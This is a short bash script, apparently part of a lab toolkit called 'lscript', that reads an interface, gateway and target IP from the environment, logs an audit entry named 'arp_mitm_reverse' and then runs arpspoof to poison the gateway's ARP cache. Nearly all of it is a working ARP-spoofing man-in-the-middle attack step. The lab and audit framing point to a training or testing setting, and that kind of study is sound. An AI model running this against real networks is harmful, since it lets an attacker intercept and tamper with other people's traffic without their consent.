#! /bin/bash
LPATH="${LPATH:-/root/lscript}"
[[ -f "$LPATH/lib/lscript_lab.sh" ]] && source "$LPATH/lib/lscript_lab.sh"

if [[ -z "$GATEINT" || -z "$TARGIP" || -z "$GATENM" ]]
then
	echo -e "Missing GATEINT, TARGIP, or GATENM."
	exit 1
fi
lscript_lab_audit "arp_mitm_reverse" "if=$GATEINT gw=$GATENM target=$TARGIP"
arpspoof -i "$GATEINT" -t "$GATENM" "$TARGIP"
